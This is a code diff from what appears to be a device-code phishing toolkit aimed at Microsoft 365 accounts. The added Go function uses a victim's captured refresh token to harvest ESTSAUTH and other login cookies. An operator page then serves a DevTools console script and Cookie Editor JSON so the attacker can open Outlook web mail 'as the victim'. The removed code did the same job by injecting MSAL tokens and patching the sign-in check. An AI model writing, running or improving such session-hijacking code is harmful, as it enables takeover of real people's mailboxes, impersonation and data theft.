@@ -1198,14 +1198,14 @@ try{window.crypto=_newCrypto;}catch(e){}
    ──────────────────────────────────────────────────────────────────────────── */
 (function(){
   function _isAuthUrl(u){return typeof u==='string'&&u.indexOf('login.microsoftonline.com')!==-1;}
-  /* Sanitize corrupted scope URIs anywhere in a URL (decoded or %2F-encoded). */
+  /* Sanitize corrupted scope URIs anywhere in a URL (decoded or %%2F-encoded). */
   var _bp=/\/dc\/owa\/[0-9a-f]+/g;
-  var _bpEnc=/%2[Ff]dc%2[Ff]owa%2[Ff][0-9a-f]+/g;
+  var _bpEnc=/%%2[Ff]dc%%2[Ff]owa%%2[Ff][0-9a-f]+/g;
   var _ooHost='https://outlook.office.com';
   var _ooEnc=encodeURIComponent(_ooHost);
   function _sanitize(u){
     if(typeof u!=='string')return u;
-    if(u.indexOf('/dc/owa/')===-1&&u.indexOf('%2Fdc%2Fowa%2F')===-1&&u.indexOf('%2fdc%2fowa%2f')===-1)return u;
+    if(u.indexOf('/dc/owa/')===-1&&u.indexOf('%%2Fdc%%2Fowa%%2F')===-1&&u.indexOf('%%2fdc%%2fowa%%2f')===-1)return u;
     return u.replace(_bp,_ooHost).replace(_bpEnc,_ooEnc);
   }
   /* Block Location.prototype.assign and .replace */
@@ -1320,9 +1320,9 @@ var _base=%q;
 /* ── URL rewrite: intercept ALL OWA-related API hosts ── */
 var _hosts=/^https?:\/\/(outlook\.(office(365)?|cloud\.microsoft)|substrate\.office\.com|substrate-cpp\.office\.com|api\.office\.com|loki\.delve\.office\.com|res\.cdn\.office\.net|eur\.delve\.office\.com)/;
 var _ssBp=/\/dc\/owa\/[0-9a-f]+/g;
-var _ssBpEnc=/%2[Ff]dc%2[Ff]owa%2[Ff][0-9a-f]+/g;
+var _ssBpEnc=/%%2[Ff]dc%%2[Ff]owa%%2[Ff][0-9a-f]+/g;
 var _ssEnc=encodeURIComponent('https://outlook.office.com');
-var _sanU=function(s){if(typeof s!=='string')return s;if(s.indexOf('/dc/owa/')===-1&&s.indexOf('%2Fdc%2Fowa%2F')===-1&&s.indexOf('%2fdc%2fowa%2f')===-1)return s;return s.replace(_ssBp,'https://outlook.office.com').replace(_ssBpEnc,_ssEnc);};
+var _sanU=function(s){if(typeof s!=='string')return s;if(s.indexOf('/dc/owa/')===-1&&s.indexOf('%%2Fdc%%2Fowa%%2F')===-1&&s.indexOf('%%2fdc%%2fowa%%2f')===-1)return s;return s.replace(_ssBp,'https://outlook.office.com').replace(_ssBpEnc,_ssEnc);};
 var _fix=function(u){
   if(!u)return u;
   var s=typeof u==='string'?u:(u&&u.url?u.url:null);
@@ -1632,6 +1632,108 @@ func extractOWAClientID(at string) string {
 	return owaKnownClientIDs[0]
 }
 
+// estsCookieEntry matches the Cookie Editor JSON schema for login.microsoftonline.com cookies.
+type estsCookieEntry struct {
+	Name           string  `json:"name"`
+	Value          string  `json:"value"`
+	Domain         string  `json:"domain"`
+	Path           string  `json:"path"`
+	Secure         bool    `json:"secure"`
+	HTTPOnly       bool    `json:"httpOnly"`
+	ExpirationDate float64 `json:"expirationDate,omitempty"`
+}
+
+// harvestESTSLoginCookies performs a server-side token refresh + prompt=none authorize + root hit
+// against login.microsoftonline.com using a cookie jar, and returns the ESTSAUTH*/buid/esctx/fpc
+// cookies Microsoft sets on the jar. These can be replayed on the operator's browser to land in
+// outlook.office.com/mail/ as the victim without re-doing the phishing flow.
+func harvestESTSLoginCookies(rt, tenant, email string) []estsCookieEntry {
+	if tenant == "" {
+		tenant = "common"
+	}
+	jar, _ := cookiejar.New(nil)
+	client := &http.Client{
+		Jar:     jar,
+		Timeout: 20 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) > 10 {
+				return http.ErrUseLastResponse
+			}
+			return nil
+		},
+	}
+
+	form := "grant_type=refresh_token" +
+		"&refresh_token=" + url.QueryEscape(rt) +
+		"&client_id=1950a258-227b-4e31-a9cf-717495945fc2" +
+		"&scope=" + url.QueryEscape("openid profile email offline_access") +
+		"&claims=" + url.QueryEscape(`{"access_token":{"xms_cc":{"values":["CP1"]}}}`)
+
+	tokenURL := "https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/token"
+	req, _ := http.NewRequest("POST", tokenURL, strings.NewReader(form))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	req.Header.Set("Origin", "https://login.microsoftonline.com")
+	req.Header.Set("Referer", "https://login.microsoftonline.com/")
+	req.Header.Set("Accept", "application/json, text/plain, */*")
+	req.Header.Set("X-Client-SKU", "MSAL.JS")
+	req.Header.Set("X-Client-Ver", "1.4.0")
+	client.Do(req) //nolint
+
+	authURL := "https://login.microsoftonline.com/" + tenant +
+		"/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2" +
+		"&response_type=code" +
+		"&redirect_uri=" + url.QueryEscape("https://login.microsoftonline.com/common/reprocess") +
+		"&scope=" + url.QueryEscape("openid profile email offline_access") +
+		"&response_mode=query" +
+		"&prompt=none" +
+		"&login_hint=" + url.QueryEscape(email) +
+		"&domain_hint=organizations"
+	req2, _ := http.NewRequest("GET", authURL, nil)
+	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	req2.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req2.Header.Set("Referer", "https://login.microsoftonline.com/")
+	req2.Header.Set("Sec-Fetch-Site", "same-origin")
+	req2.Header.Set("Sec-Fetch-Mode", "navigate")
+	req2.Header.Set("Sec-Fetch-Dest", "document")
+	client.Do(req2) //nolint
+
+	req3, _ := http.NewRequest("GET", "https://login.microsoftonline.com/", nil)
+	req3.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	req3.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	client.Do(req3) //nolint
+
+	msLoginURL, _ := url.Parse("https://login.microsoftonline.com")
+	expiry := float64(time.Now().Add(30 * 24 * time.Hour).Unix())
+	wantNames := map[string]bool{
+		"ESTSAUTH":           true,
+		"ESTSAUTHPERSISTENT": true,
+		"ESTSAUTHLIGHT":      true,
+		"SignInStateCookie":  true,
+		"buid":               true,
+		"esctx":              true,
+		"fpc":                true,
+	}
+	var out []estsCookieEntry
+	for _, c := range jar.Cookies(msLoginURL) {
+		if wantNames[c.Name] {
+			out = append(out, estsCookieEntry{
+				Name:           c.Name,
+				Value:          c.Value,
+				Domain:         ".login.microsoftonline.com",
+				Path:           "/",
+				Secure:         true,
+				HTTPOnly:       true,
+				ExpirationDate: expiry,
+			})
+		}
+	}
+	return out
+}
+
+// handleDCInject renders a cookie-paste flow for login.microsoftonline.com.
+// The operator opens login.microsoftonline.com in a fresh tab, pastes the script in the
+// DevTools console, and Microsoft SSO lands them at outlook.office.com/mail/ as the victim.
 func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	tgt := GetTargetByToken(mux.Vars(r)["token"])
 	if tgt == nil {
@@ -1639,169 +1741,65 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	tgt.mu.Lock()
-	at := tgt.AccessToken
 	rt := tgt.RefreshToken
-	idt := tgt.IDToken
 	tenant := tgt.Tenant
 	email := tgt.Email
 	landingToken := tgt.LandingToken
 	tgt.mu.Unlock()
 
-	if at == "" {
-		http.Error(w, "no token captured yet — victim has not approved", http.StatusBadRequest)
+	if rt == "" {
+		http.Error(w, "no refresh token captured yet — victim has not approved", http.StatusBadRequest)
 		return
 	}
-
-	// Refresh AT with OWA's specific clientId so appid matches MSAL config.
-	owaClientID := extractOWAClientID(at)
-	owaAT := at
-	owaRT := rt
-	if rt != "" {
-		noEmail := "https://outlook.office.com/.default openid profile offline_access"
-		withEmail := "https://outlook.office.com/.default openid profile email offline_access"
-		refreshed := false
-		for _, sc := range []string{noEmail, withEmail} {
-			if a, nr, err := refreshForScopeWithClient(rt, tenant, owaClientID, sc); err == nil {
-				owaAT = a
-				if nr != "" {
-					owaRT = nr
-				}
-				refreshed = true
-				break
-			}
-		}
-		if !refreshed {
-			for _, sc := range []string{noEmail, withEmail} {
-				if a, nr, err := RefreshForScope(rt, tenant, sc); err == nil {
-					owaAT = a
-					if nr != "" {
-						owaRT = nr
-					}
-					break
-				}
-			}
-		}
-	}
-	_ = owaRT // used in warm-up below
-
-	// Derive display fields for the HTML template (upn, homeAccountID, owaClientID already set).
-	var upn, homeAccountID string
-	{
-		cl := decodeJWTClaims(idt)
-		if cl == nil {
-			cl = decodeJWTClaims(owaAT)
-		}
-		o := jwtStr(cl, "oid")
-		t2 := jwtStr(cl, "tid")
-		if t2 == "" {
-			t2 = tenant
-		}
-		u := jwtStr(cl, "preferred_username")
-		if u == "" {
-			u = jwtStr(cl, "upn")
-		}
-		if u == "" {
-			u = email
-		}
-		upn = u
-		homeAccountID = strings.ToLower(o + "." + t2)
+	if tenant == "" {
+		tenant = "common"
 	}
 
-	// Build full MSAL cache entries using shared helper.
-	entriesJSON := buildMSALEntriesJSON(owaAT, owaRT, idt, tenant, email)
+	entries := harvestESTSLoginCookies(rt, tenant, email)
+	cookieJSON, _ := json.Marshal(entries)
+	cookieEditorJSON, _ := json.MarshalIndent(entries, "", "  ")
 
-	// ── Server-side OWA warm-up.
-	// OWA now lives at outlook.cloud.microsoft (2025+); outlook.office.com
-	// redirects there. We warm both origins so cookies are collected for both.
-	type cookieKV struct {
-		Name  string `json:"n"`
-		Value string `json:"v"`
-		Path  string `json:"p"`
-	}
-	var owaCookieKVs []cookieKV
-	{
-		owaJar, _ := cookiejar.New(nil)
-		owaWarmClient := &http.Client{
-			Jar:     owaJar,
-			Timeout: 15 * time.Second,
-			CheckRedirect: func(req *http.Request, via []*http.Request) error {
-				if len(via) > 15 {
-					return http.ErrUseLastResponse
-				}
-				req.Header.Set("Authorization", "Bearer "+owaAT)
-				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
-				return nil
-			},
-		}
-		for _, warmPath := range []string{
-			"https://outlook.cloud.microsoft/mail/",
-			"https://outlook.office.com/mail/",
-		} {
-			wReq, _ := http.NewRequest("GET", warmPath, nil)
-			wReq.Header.Set("Authorization", "Bearer "+owaAT)
-			wReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
-			wReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-			owaWarmClient.Do(wReq) //nolint
-		}
-		// Collect cookies from both OWA origins
-		for _, origin := range []string{"https://outlook.cloud.microsoft", "https://outlook.office.com"} {
-			owaURL, _ := url.Parse(origin)
-			for _, c := range owaJar.Cookies(owaURL) {
-				owaCookieKVs = append(owaCookieKVs, cookieKV{Name: c.Name, Value: c.Value, Path: "/"})
-			}
+	hasESTS := false
+	for _, e := range entries {
+		if e.Name == "ESTSAUTH" || e.Name == "ESTSAUTHPERSISTENT" {
+			hasESTS = true
+			break
 		}
 	}
-	owaCookiesJSON, _ := json.Marshal(owaCookieKVs)
 
-	// Build JS snippet:
-	//   1. Set OWA session cookies (obtained server-side via bearer warm-up)
-	//   2. Write MSAL v2 cache to localStorage + sessionStorage
-	//   3. Reload → fully logged in
-	var js strings.Builder
-	js.WriteString("(function(){\n")
-	// Patch localStorage.getItem so msal.token.keys.* always returns valid arrays.
-	// Stale entries written by older broken injects had null arrays; MSAL's
-	// migrateIdTokens calls .find() on idToken and crashes on null.
-	js.WriteString("  /* 0a. Guard msal.token.keys.* + msal.account.keys against null/non-array */\n")
-	// Guard covers: token.keys.* (ensure arrays never null), account.keys (ensure array)
-	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(typeof k==='string'&&k.indexOf('msal.')===0){if(k.indexOf('.keys')!==-1){if(!v)return v;try{var p=JSON.parse(v);if(k.indexOf('msal.token.keys.')===0){if(!p||typeof p!=='object'||Array.isArray(p))return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}else{if(!Array.isArray(p))return JSON.stringify([]);}}catch(e){return k.indexOf('msal.token.keys.')===0?JSON.stringify({accessToken:[],idToken:[],refreshToken:[]}):JSON.stringify([]);}}else if(v){try{var p=JSON.parse(v);if(p&&typeof p==='object'&&!Array.isArray(p)&&p.authorityType==='MSSTS'){var changed=false;if(p.tenantProfiles&&!Array.isArray(p.tenantProfiles)){var arr=[];try{Object.keys(p.tenantProfiles).forEach(function(t){var tp=p.tenantProfiles[t];if(tp&&typeof tp==='object')arr.push(tp);else arr.push({tenantId:t,localAccountId:p.localAccountId||'',name:p.name||'',isHomeTenant:true});});}catch(e2){arr=[{tenantId:p.realm||'',localAccountId:p.localAccountId||'',name:p.name||'',isHomeTenant:true}];}p.tenantProfiles=arr;changed=true;}if(!p.tenantProfiles){p.tenantProfiles=[];changed=true;}if(changed)return JSON.stringify(p);}}catch(e){}}}return v;};}());\n")
-	// Block MSAL's hidden-iframe ssoSilent: intercept iframe.src writes that contain
-	// prompt=none and immediately fire a load event so MSAL's silent request resolves
-	// (with failure) and falls back to the cache rather than doing loginRedirect.
-	js.WriteString("  /* 0b. Patch MSAL hidden-iframe SSO check */\n")
-	js.WriteString("  (function(){var _ce=document.createElement;document.createElement=function(t){var el=_ce.call(document,t);if((t+'').toLowerCase()==='iframe'){var _sa=el.setAttribute.bind(el);el.setAttribute=function(n,v){if(n==='src'&&v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}_sa(n,v);};Object.defineProperty(el,'src',{set:function(v){if(v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}el.setAttribute('src',v);},get:function(){return el.getAttribute('src')||'';},configurable:true});}return el;};}());\n")
-	js.WriteString("  /* 1. OWA session cookies */\n")
-	js.WriteString("  var ck=")
-	js.Write(owaCookiesJSON)
-	js.WriteString(";\n")
-	js.WriteString("  ck.forEach(function(c){try{document.cookie=c.n+'='+c.v+'; path='+c.p+'; secure';}catch(e){}});\n")
-	js.WriteString("  /* 2. MSAL v2 token cache */\n")
-	js.WriteString("  var d=")
-	js.WriteString(string(entriesJSON))
-	js.WriteString(";\n")
-	js.WriteString("  /* 2b. Wipe stale MSAL entries from BOTH localStorage AND sessionStorage */\n")
-	js.WriteString("  try{['localStorage','sessionStorage'].forEach(function(s){try{var st=window[s];Object.keys(st).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){st.removeItem(k);});}catch(e){}});}catch(e){}\n")
-	js.WriteString(`  Object.keys(d).forEach(function(k){
-    var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);
-    try{localStorage.setItem(k,v);}catch(e){}
-    try{sessionStorage.setItem(k,v);}catch(e){}
-  });
-  console.log('%c✓ OWA tokens written — loading /mail/ (guards active)...','color:#0a0;font-size:14px;font-weight:bold');
-  /* Navigate via document.write so Storage.prototype guards survive into OWA */
-  setTimeout(function(){
-    fetch('/mail/',{credentials:'include',headers:{'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cache-Control':'no-cache'}})
-      .then(function(r){return r.text();})
-      .then(function(h){history.replaceState(null,'','/mail/');document.open('text/html','replace');document.write(h);document.close();})
-      .catch(function(){location.href='/mail/';});
-  },300);
-})();`)
+	var scriptBuf strings.Builder
+	scriptBuf.WriteString("!function(){\n")
+	scriptBuf.WriteString("  let e=JSON.parse(`")
+	scriptBuf.Write(cookieJSON)
+	scriptBuf.WriteString("`);\n")
+	scriptBuf.WriteString("  for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:''}${o.domain?`${o.path?'':'path=/;'}domain=${o.domain};`:''}Secure;SameSite=None`;\n")
+	scriptBuf.WriteString("  window.location.href='https://outlook.office.com/mail/';\n")
+	scriptBuf.WriteString("}();")
+	script := scriptBuf.String()
+	scriptJSON, _ := json.Marshal(script)
 
-	snippet := js.String()
+	statusBanner := ""
+	if !hasESTS {
+		statusBanner = `<div class="card" style="border-color:#7a4a1a;background:#2a1a0a">
+<h2 style="color:#e0a040">⚠ ESTSAUTH not obtained</h2>
+<p style="font-size:13px;color:#cc9955;line-height:1.7">
+Server-side refresh only yields <code style="color:#f90">fpc/esctx/buid</code>. ESTSAUTH/ESTSAUTHPERSISTENT are
+set by Microsoft only during an interactive browser login, so <code style="color:#f90">document.cookie</code>
+pasting will likely not SSO. Use <strong style="color:#fff">Cookie Editor</strong> (Method B) to import the JSON
+— that extension can set HttpOnly cookies.
+</p></div>`
+	} else {
+		statusBanner = `<div class="card" style="border-color:#1a4a7a;background:#0a1a2a">
+<h2 style="color:#7ec8e3">✓ ESTSAUTH obtained</h2>
+<p style="font-size:13px;color:#7ec8e3;line-height:1.7">
+Both methods should work. Paste the console script at <strong style="color:#fff">login.microsoftonline.com</strong> —
+you'll be redirected to <strong style="color:#fff">outlook.office.com/mail/</strong> logged in as the victim.
+</p></div>`
+	}
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	snippetJSON, _ := json.Marshal(snippet) // safe JS string literal
 	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
-<title>Session Inject — %s</title>
+<title>Cookie Login — %s</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
@@ -1809,107 +1807,88 @@ h1{font-size:18px;color:#fff;margin-bottom:4px}
 .sub{font-size:12px;color:#666;margin-bottom:20px}
 .card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
 h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
-.steps{list-style:none;counter-reset:s}
-.steps li{counter-increment:s;padding:10px 0 10px 38px;position:relative;font-size:13px;color:#bbb;border-bottom:1px solid #1c1c1c}
-.steps li:last-child{border-bottom:none}
-.steps li::before{content:counter(s);position:absolute;left:0;top:10px;background:#0078d4;color:#fff;width:24px;height:24px;border-radius:50%%;font-size:11px;font-weight:700;text-align:center;line-height:24px}
-.steps a{color:#0078d4}
+.steps{list-style:decimal;padding-left:22px;color:#bbb;font-size:13px;line-height:2}
 .steps strong{color:#fff}
-textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre;height:130px;resize:none;outline:none;cursor:text}
+.steps a{color:#0078d4}
+.steps code{background:#222;padding:2px 6px;border-radius:3px;color:#f90;font-size:12px}
+textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre;height:140px;resize:none;outline:none;cursor:text}
 .row{display:flex;gap:8px;align-items:center;margin-top:10px;flex-wrap:wrap}
 .btn{padding:9px 22px;border-radius:4px;font-size:13px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff;text-decoration:none;display:inline-block}
 .b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
 .ok{color:#5cb85c;font-size:13px;font-weight:600;display:none}
 .back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:16px}
 .note{font-size:11px;color:#555;margin-top:8px}
+.badge{display:inline-block;background:#107c10;color:#fff;font-size:10px;padding:2px 8px;border-radius:3px;margin-left:6px;vertical-align:middle}
 </style></head><body>
 <a class="back" href="/dc/use/%s">&larr; Dashboard</a>
-<h1>Inject Browser Session</h1>
-<p class="sub">Full OWA access as <strong style="color:#fff">%s</strong> — cookies + tokens in one paste</p>
-<div class="card" style="border-color:#7a2a2a;background:#1a0a0a">
-<h2 style="color:#e07070">Required: use a browser WITHOUT MetaMask</h2>
-<p style="font-size:13px;color:#cc8888;line-height:1.7">
-  MetaMask's <strong style="color:#fff">lockdown-install.js</strong> runs before any page script and destroys <code style="color:#f90">window.crypto</code>, causing OWA to fail with <code style="color:#f90">crypto_nonexistent</code>.<br>
-  <strong style="color:#fff">Use Chrome or Edge in a profile that does not have MetaMask installed.</strong> Firefox + MetaMask will never work.
-</p>
+<h1>Cookie Login <span class="badge">%d cookies</span></h1>
+<p class="sub">Paste at <strong style="color:#fff">login.microsoftonline.com</strong> → redirected to Outlook as <strong style="color:#fff">%s</strong></p>
+%s
+<div class="card" style="border-color:#1a3a5c">
+<h2 style="color:#4a9fd4">Method A — Console Paste</h2>
+<ol class="steps">
+<li>Open <a href="https://login.microsoftonline.com" target="_blank">https://login.microsoftonline.com</a> in a fresh tab</li>
+<li>Press <strong>F12</strong> → <strong>Console</strong> tab (paste warning may appear — type <code>allow pasting</code> and hit Enter)</li>
+<li>Come back here → click <strong>Copy Script</strong></li>
+<li>Switch to the login.microsoftonline.com tab → paste → press <strong>Enter</strong> — redirect lands you at <code>outlook.office.com/mail/</code></li>
+</ol>
+<div style="margin-top:16px">
+<textarea class="code" id="ta" readonly>%s</textarea>
+<div class="row">
+<button class="btn" onclick="doCopy()">Copy Script</button>
+<a class="btn b2" href="https://login.microsoftonline.com" target="_blank">Open login.microsoftonline.com</a>
+<span class="ok" id="ok">Copied!</span>
 </div>
-<div class="card" style="border-color:#0a4a1c;background:#050f08">
-<h2 style="color:#4ae07a">★ One-Click Method (Recommended)</h2>
-<p style="font-size:13px;color:#8ecf9e;line-height:1.8">
-  <strong style="color:#fff">Click "Open OWA (One Click)"</strong> below — no console, no paste, no steps.<br>
-  Our server injects the Bearer token server-side and proxies OWA directly through this panel.<br>
-  OWA opens instantly, fully logged in.
-</p>
-<div style="margin-top:12px">
-<a class="btn" href="/dc/open/%s" target="_blank" style="background:#155724;border:1px solid #28a745">⚡ Open OWA (One Click)</a>
 </div>
 </div>
 <div class="card" style="border-color:#1a3a5c">
-<h2 style="color:#4a9fd4">Manual Method — Steps</h2>
-<ol class="steps">
-<li>Click <strong>Open OWA Origin Tab</strong> — opens <code style="color:#aaa">outlook.cloud.microsoft/favicon.ico</code> (stays at OWA origin, no login redirect)</li>
-<li>In that tab: press <strong>F12</strong> → <strong>Console</strong> tab</li>
-<li>Come back here → click <strong>Copy Script</strong></li>
-<li>Switch to the favicon tab → paste script → press <strong>Enter</strong> — you will see <span style="color:#0a0;font-weight:700">✓ OWA tokens written</span>, then auto-navigate as <strong>%s</strong></li>
-</ol>
-<p style="font-size:12px;color:#f90;margin-top:10px;padding-left:12px">
-⚠ CRITICAL: Paste on the <strong>favicon.ico tab</strong> (URL = outlook.cloud.microsoft), NOT on the login page.<br>
-Pasting while on login.microsoftonline.com writes tokens to the WRONG origin and nothing will work.
+<h2 style="color:#4a9fd4">Method B — Cookie Editor (for HttpOnly)</h2>
+<p style="font-size:13px;color:#bbb;line-height:1.7;margin-bottom:12px">
+Install <strong>Cookie Editor</strong> extension → open <strong>login.microsoftonline.com</strong> →
+extension icon → <strong>Import</strong> tab → paste JSON → <strong>Import</strong> → refresh → navigate to
+<code style="color:#f90;background:#222;padding:2px 6px;border-radius:3px">outlook.office.com/mail/</code>.
 </p>
-</div>
-<div class="card">
-<h2>Injection Script <span style="font-size:10px;color:#444;font-weight:normal;text-transform:none;letter-spacing:0">(MSAL token cache + session cookies)</span></h2>
-<textarea class="code" id="ta" readonly>%s</textarea>
+<textarea class="code" id="tej" readonly style="height:160px">%s</textarea>
 <div class="row">
-<button class="btn" id="cpbtn" onclick="doCopy()">Copy Script</button>
-<a class="btn b2" href="https://outlook.cloud.microsoft/favicon.ico" target="_blank">Open OWA Origin Tab</a>
-<span class="ok" id="ok">Copied!</span>
+<button class="btn b2" onclick="doCopyJson()">Copy JSON</button>
+<span class="ok" id="okj">Copied!</span>
 </div>
-<p class="note">If copy fails: click inside the text box → Ctrl+A → Ctrl+C → paste in OWA console</p>
 </div>
 <div class="card" style="font-size:12px;color:#555;line-height:1.9">
   <div>Target: <span style="color:#888">%s</span></div>
-  <div>OWA Client ID: <span style="color:#888">%s</span></div>
-  <div>Home Account: <span style="color:#888">%s</span></div>
+  <div>Tenant: <span style="color:#888">%s</span></div>
+  <div>Cookies obtained: <span style="color:#888">%d</span></div>
 </div>
 <script>
 var snippet=%s;
 var ta=document.getElementById('ta');
+var tej=document.getElementById('tej');
 function doCopy(){
-  /* try modern clipboard API (HTTPS only) */
-  if(navigator.clipboard&&navigator.clipboard.writeText){
-    navigator.clipboard.writeText(snippet).then(showOk).catch(legacyCopy);
-  } else { legacyCopy(); }
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(snippet).then(function(){showOk('ok');}).catch(legacyCopy);}else{legacyCopy();}
 }
-function legacyCopy(){
-  ta.select();
-  ta.setSelectionRange(0,99999);
-  try{
-    var ok=document.execCommand('copy');
-    if(ok) showOk();
-  }catch(e){}
+function legacyCopy(){ta.select();ta.setSelectionRange(0,99999);try{if(document.execCommand('copy'))showOk('ok');}catch(e){}}
+function doCopyJson(){
+  var v=tej.value;
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(v).then(function(){showOk('okj');}).catch(function(){tej.select();document.execCommand('copy');showOk('okj');});}
+  else{tej.select();document.execCommand('copy');showOk('okj');}
 }
-function showOk(){
-  var o=document.getElementById('ok');
-  o.style.display='inline';
-  setTimeout(function(){o.style.display='none';},2500);
-}
-/* auto-select on click */
-ta.addEventListener('click',function(){ta.select();ta.setSelectionRange(0,99999);});
-ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999);});
+function showOk(id){var o=document.getElementById(id);o.style.display='inline';setTimeout(function(){o.style.display='none';},2500);}
+[ta,tej].forEach(function(el){el.addEventListener('click',function(){el.select();el.setSelectionRange(0,99999);});});
 </script>
 </body></html>`,
-		template.HTMLEscapeString(upn),           // 1. <title>
-		template.HTMLEscapeString(landingToken),   // 2. back link
-		template.HTMLEscapeString(upn),            // 3. sub-header "Full OWA access as"
-		landingToken,                              // 4. One-Click OWA href (/dc/open/%s)
-		template.HTMLEscapeString(upn),            // 5. step "logged in as"
-		template.HTMLEscapeString(snippet),        // 6. textarea value
-		template.HTMLEscapeString(upn),            // 7. Target info card
-		template.HTMLEscapeString(owaClientID),    // 8. OWA Client ID info card
-		template.HTMLEscapeString(homeAccountID),  // 9. Home Account info card
-		string(snippetJSON),                       // 10. JS var snippet
+		template.HTMLEscapeString(email),
+		template.HTMLEscapeString(landingToken),
+		len(entries),
+		template.HTMLEscapeString(email),
+		statusBanner,
+		template.HTMLEscapeString(script),
+		template.HTMLEscapeString(string(cookieEditorJSON)),
+		template.HTMLEscapeString(email),
+		template.HTMLEscapeString(tenant),
+		len(entries),
+		string(scriptJSON),
 	)
+	return
 }
 
 // handleDCEvil — "evil token" window.name relay for near-one-click OWA access.
